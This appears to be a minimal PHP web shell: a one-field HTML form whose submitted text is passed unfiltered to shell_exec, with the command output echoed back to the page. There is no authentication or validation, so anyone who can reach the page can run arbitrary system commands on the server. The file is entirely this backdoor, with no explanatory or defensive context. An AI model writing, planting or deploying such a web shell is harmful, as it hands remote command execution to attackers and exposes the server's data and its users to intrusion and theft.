<?php
if(isset($_POST['commento']))
{
  $output = shell_exec($_POST['commento']); //--norestore

	echo '<pre>';
	print_r($output);
	echo '</pre>';

}
?>

<form action="#" method="POST">
<input type="text" name="commento">
<input type="submit">
</form>
